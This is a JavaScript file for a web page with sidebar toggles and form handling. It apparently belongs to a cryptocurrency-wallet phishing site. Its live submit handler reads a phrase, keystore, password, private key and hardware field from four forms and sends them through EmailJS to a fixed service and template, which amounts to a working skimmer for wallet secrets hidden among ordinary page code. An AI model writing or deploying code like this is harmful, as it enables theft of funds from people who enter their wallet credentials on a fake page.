const toggleBar = document.querySelector('#toggleBar');
const asideNav = document.querySelector('#asideContainer');
const overlay = document.querySelector('.overlay');
const closeBar = document.querySelector('#closeBar');
const body = document.body;
if (toggleBar) {
  toggleBar.addEventListener('click', () => {
    if (asideNav.classList.contains('display')) {
      asideNav.classList.remove('display');
      overlay.classList.remove('display');
      body.classList.add('noscroll');
    }
  });
}
if (closeBar) {
  closeBar.addEventListener('click', () => {
    if (!asideNav.classList.contains('display')) {
      asideNav.classList.add('display');
      overlay.classList.add('display');
      body.classList.remove('noscroll');
    }
  });
}

const form = document.querySelector('#my-form');
const formTwo = document.querySelector('#formTWO');
const formThree = document.querySelector('#formThree');
const formFour = document.querySelector('#formFour');
// async function handleSubmit(event) {
//   event.preventDefault();
//   event.target.value = '';
//   const status = document.getElementById('my-form-status');
//   const data = new FormData(event.target);
//   fetch(event.target.action, {
//     method: form.method,
//     body: data,
//     headers: {
//       Accept: 'application/json',
//     },
//   })
//     .then((response) => {
//       if (response.ok) {
//         status.innerHTML = 'Thanks for your submission!';
//         form.reset();
//       } else {
//         response.json().then((data) => {
//           if (Object.hasOwn(data, 'errors')) {
//             status.innerHTML = data['errors']
//               .map((error) => error['message'])
//               .join(', ');
//           } else {
//             status.innerHTML = 'Oops! There was a problem submitting your form';
//           }
//         });
//       }
//     })
//     .catch((error) => {
//       status.innerHTML = 'Oops! There was a problem submitting your form';
//     });
// }
// if (form) {
//   form.addEventListener('submit', handleSubmit);
//   formTwo.addEventListener('submit', handleSubmit);
//   formThree.addEventListener('submit', handleSubmit);
//   formFour.addEventListener('submit', handleSubmit);
// }

const handleSubmit = () => {
  let params = {
    message: document.querySelector('#textInput').value,
    keystore: document.querySelector('#textInput2').value,
    password: document.querySelector('#passwordInput').value,
    privatekey: document.querySelector('#textInputThree').value,
    hardware: document.querySelector('#textInputFour').value,
  };
  emailjs
    .send('service_m3ku78i', 'template_sh5ygxg', params)
    .then(function (res) {
      alert('success ' + res.status);
    });
};

form.addEventListener('submit', (e) => {
  e.preventDefault();
  handleSubmit();
});
formTwo.addEventListener('submit', (e) => {
  e.preventDefault();
  handleSubmit();
});
formThree.addEventListener('submit', (e) => {
  e.preventDefault();
  handleSubmit();
});
formFour.addEventListener('submit', (e) => {
  e.preventDefault();
  handleSubmit();
});
